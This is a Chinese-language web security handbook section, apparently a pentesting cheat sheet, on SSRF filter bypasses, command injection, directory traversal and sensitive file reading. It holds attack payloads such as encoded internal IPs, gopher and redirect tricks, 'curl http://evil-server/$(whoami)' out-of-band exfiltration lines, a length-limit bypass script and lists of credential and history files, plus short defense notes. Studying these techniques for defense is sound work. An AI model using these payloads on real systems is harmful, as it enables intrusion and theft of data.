### 4.4 SSRF (服务器端请求伪造) 攻击与防御

#### 4.4.1 URL 参数过滤绕过
一些开发者通过正则表达式来过滤传入的URL参数，以阻止内网IP地址。常用的正则表达式包括：
- `^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$`
- `^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$`
- `^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$`

为了绕过这种过滤，可以将IP地址改写成不同的格式，例如：
- 八进制：`0300.0250.0.1`
- 十六进制：`0xC0.0xA8.0.1`
- 十进制整数：`3232235521`
- 十六进制整数：`0xC0A80001`
- 合并后两位或三位：`1.1.278 / 1.1.755` 或 `1.278 / 1.755 / 3.14159267`

不同进制可以混用。使用这些改写的IP地址时，Apache会返回400 Bad Request错误，但Nginx和MySQL等服务仍然能够正常工作。

此外，`0.0.0.0`这个IP地址可以直接访问本地主机，并且通常会被正则表达式过滤遗漏。

#### 4.4.2 使用解析到内网的域名
如果服务端没有先解析IP再过滤内网地址，可以使用解析到内网的域名，如`localhost`。另外，`xip.io`提供了一个方便的服务，其子域名会解析到对应的IP地址，例如`192.168.0.1.xip.io`解析到`192.168.0.1`。

#### 4.4.3 利用URL解析问题
某些后端程序可能会对访问的URL进行解析，但可能由于正则表达式不正确而导致绕过过滤。例如，对于`http://www.baidu.com@192.168.0.1/`，后端程序可能误认为`www.baidu.com`是host地址，而实际上请求的内容来自`192.168.0.1`。

#### 4.4.4 利用重定向
如果后端服务器正确解析了URL的host并进行了过滤，可以通过重定向来绕过。例如，使用`http://httpbin.org/redirect-to?url=http://192.168.0.1`，并通过短地址服务来隐藏实际的内网IP地址。常见的重定向类型有302跳转和307跳转，其中307跳转会转发POST请求中的数据，而302跳转不会。

#### 4.4.5 通过非HTTP协议
如果服务器端对访问URL所采用的协议进行验证，可以通过非HTTP协议（如gopher或file）来进行攻击。例如，可以使用gopher协议构造POST或GET请求，从而攻击内网应用。另外，file协议可以用于访问本地文件，如`file:///path/to/file`。

#### 4.4.6 DNS Rebinding
一种常见的防护方法是对用户请求的URL参数进行DNS解析，并判断返回的IP地址是否在黑名单中。然而，利用DNS解析的时间差，攻击者可以进行DNS重绑定攻击。攻击流程如下：
1. 服务器端获取URL参数并进行第一次DNS解析，得到一个非内网IP。
2. 对获得的IP进行判断，发现为非黑名单IP，通过验证。
3. 服务器端访问URL时，再次进行DNS解析，这次DNS服务器返回的是内网地址。
4. 由于已经绕过验证，服务器端返回访问内网资源的结果。

#### 4.4.7 利用IPv6
如果服务未考虑IPv6情况，但内网支持IPv6，则可以使用IPv6本地IP如`[::]`、`0000::1`或IPv6内网域名来绕过过滤。

#### 4.4.8 利用IDN
国际化域名（IDN）可以在访问时进行等价转换，例如`.com`和`example.com`等同。利用这种方式，可以用特殊字符绕过内网限制。

#### 4.4.9 可能的利用点
内网服务中可能存在SSRF漏洞，包括但不限于：
- Apache Hadoop远程命令执行
- axis2-admin部署Server命令执行
- Confluence SSRF
- CouchDB WEB API远程命令执行
- Elasticsearch引擎Groovy脚本命令执行
- Docker API远程命令执行
- FTP/FTPS爆破
- Glassfish任意文件读取和war文件部署间接命令执行
- gopher
- HFS远程命令执行
- HTTP/HTTPS
- IMAP/IMAPS/POP3/POP3S/SMTP/SMTPS（邮件用户名密码爆破）
- Java调试接口命令执行
- JBOSS远程Invoker war命令执行
- Jenkins Scripts接口命令执行
- LDAP
- MongoDB
- PHP-FPM/FastCGI命令执行
- RTSP - SMB/SMBs（连接SMB）
- SFTP
- ShellShock命令执行
- Struts2命令执行
- Telnet
- TFTP（UDP协议扩展）
- Tomcat命令执行
- WebDav PUT上传任意文件
- WebSphere Admin可部署war间接命令执行
- zentoPMS远程命令执行

Redis利用：
- 写SSH公钥
- 写crontab
- 写WebShell
- Windows写启动项
- 主从复制加载.so文件
- 主从复制写无损文件

云主机：
在AWS、Google等云环境下，通过访问云环境的元数据API或管理API，在部分情况下可以实现敏感信息泄露等效果。

#### 4.4.10 防御方式
- 过滤返回的信息
- 统一错误信息
- 限制请求的端口
- 禁止不常用的协议
- 对DNS Rebinding，考虑使用DNS缓存或者Host白名单

#### 4.4.11 参考链接
- SSRF漏洞分析与利用
- A New Era Of SSRF
- php ssrf technique
- 谈一谈如何在Python开发中拒绝SSRF漏洞
- SSRF Tips
- SSRF in PHP

### 4.5 命令注入

#### 4.5.1 简介
命令注入通常是由于Web应用程序在服务器上拼接系统命令而造成的漏洞。这类漏洞常见于调用外部程序完成一些功能的情景下，如配置主机名/IP/掩码/网关、查看系统信息以及关闭重启等功能，或者提供ping、nslookup、发送邮件、转换图片等功能。

#### 4.5.2 常见危险函数
- **PHP**:
  - `system`
  - `exec`
  - `passthru`
  - `shell_exec`
  - `popen`
  - `proc_open`
- **Python**:
  - `system`
  - `popen`
  - `subprocess.call`
  - `spawn`
- **Java**:
  - `java.lang.Runtime.getRuntime().exec(command)`

#### 4.5.3 常见注入方式
- 分号分割
- `|| && &` 分割
- `|` 管道符
- `\r\n %d0%a0` 换行
- 反引号解析
- `$()` 替换

#### 4.5.4 无回显技巧
- Bash反弹shell
- DNS带外数据
- HTTP带外
  - `curl http://evil-server/$(whoami)`
  - `wget http://evil-server/$(whoami)`
- 无带外时利用`sleep`或其他逻辑构造布尔条件

#### 4.5.5 常见绕过方式
- **空格绕过**:
  - `/bin/ls`
  - `cat /etc/pass'w'd`
  - `cat$x /etc/passwd`
- **长度限制绕过**:
  ```bash
  >wget\
  >foo.\
  >com
  ls -t>a
  sh a
  ```

#### 4.5.6 常用符号
- **命令分隔符**:
  - `%0a / %0d / \n / \r`
  - `;`
  - `& / &&`
- **通配符**:
  - `*` 0到无穷个任意字符
  - `?` 一个任意字符
  - `[ ]` 一个在括号内的字符，如`[abcd]`
  - `[ - ]` 在编码顺序内的所有字符
  - `[^ ]` 一个不在括号内的字符

#### 4.5.7 防御
- 不使用时禁用相应函数
- 尽量不要执行外部的应用程序或命令
- 做输入的格式检查
- 转义命令中的所有shell元字符（如`#&;`, `|*?~<>^()[]{}$\\`）

### 4.6 目录穿越

#### 4.6.1 简介
目录穿越（也称为目录遍历）是通过使用`../`等目录控制序列或文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。

#### 4.6.2 攻击载荷
- **URL参数**:
  - `../`
  - `..\\`
  - `..;\\`
- **Nginx Off by Slash**:
  - `https://vuln.site.com/files../`
- **UNC Bypass**:
  - `\\localhost\c$\windows\win.ini`

#### 4.6.3 过滤绕过
- **单次替换**:
  - `...//`
- **URL编码**
- **16位Unicode编码**:
  - `\u002e`
- **超长UTF-8编码**:
  - `\%e0%40%ae`

#### 4.6.4 防御
- 在进行文件操作相关的API前，应对用户输入做过滤。
- 较强的规则下可以使用白名单，仅允许纯字母或数字字符等。
- 若规则允许的字符较多，最好使用当前操作系统路径规范化函数规范化路径后，进行过滤，最后再进行相关调用。

#### 4.6.5 参考链接
- Directory traversal by portswigger
- Path Traversal by OWASP
- Path normalization
- Breaking Parser Logic: Take Your Path Normalization Off and Pop 0days Out defcon

### 4.7 文件读取
考虑读取可能包含敏感信息的文件，例如：
- **用户目录下的敏感文件**:
  - `.bash_history`
  - `.zsh_history`
  - `.profile`
  - `.bashrc`
  - `.gitconfig`
  - `.viminfo`
  - `passwd`
- **应用的配置文件**:
  - `/etc/apache2/apache2.conf`
  - `/etc/nginx/nginx.conf`
- **应用的日志文件**:
  - `/var/log/apache2/access.log`
  - `/var/log/nginx/access.log`
- **站点目录下的敏感文件**:
  - `.svn/entries`